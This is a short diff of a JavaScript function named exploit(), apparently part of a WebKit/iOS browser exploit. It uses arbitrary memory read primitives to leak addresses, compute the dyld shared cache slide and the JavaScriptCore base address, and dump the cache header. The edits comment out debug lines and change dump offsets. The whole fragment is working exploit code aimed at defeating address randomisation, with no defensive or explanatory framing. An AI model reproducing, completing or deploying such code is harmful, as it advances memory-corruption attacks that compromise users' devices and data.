@@ -489,8 +489,8 @@ function exploit(){
 	    var slide = Sub(v_tlb, vtab); 
 	    var anchor = memory.read_i64(v_tlb,0)
 	    log('[+] Anchor address is' + anchor.toString(16));
-	    log('lo of anchor ' + anchor.lo() & 0xfff);
-	    var hdr = Sub(anchor,b2u32(anchor) & 0xfff);
+	   // log('lo of anchor ' + anchor.lo() & 0xfff);
+	    //var hdr = Sub(anchor,b2u32(anchor) & 0xfff);
 	    log('[+] That means that the dyld shared cache slide should be '+slide.toString(16));
 	    var base = Add(new Int64('0x1881BD000'), slide);
 	    log('[+] And thus the JavaScriptCore base is '+base.toString(16));
@@ -501,9 +501,9 @@ function exploit(){
 	    log('[+] Which has magic '+magic.toString(16));
 	    memory.read_i32(magic);
 	    log('magic = ' + magic);
-	    var dcache_dump = String.fromCharCode(...memory.copyfrom(dcache_base, 0, 500)); //dump first 100-bytes
+	    var dcache_dump = String.fromCharCode(...memory.copyfrom(dcache_base, 0x10, 100)); //dump first 100-bytes
 	    log('[+] Dumping dyld shared cache...');
-	    log(hexdump(dcache_dump, 8, dcache_base));
+	    log(hexdump(dcache_dump, 0, dcache_base));
 	    var dcache_base_seg = null;
 	    var dcache_nsegs = memory.read_i32(dcache_base + 0x10);
         log('[+] The dyld shared cache seems to have '+dcache_nsegs+' segments.');
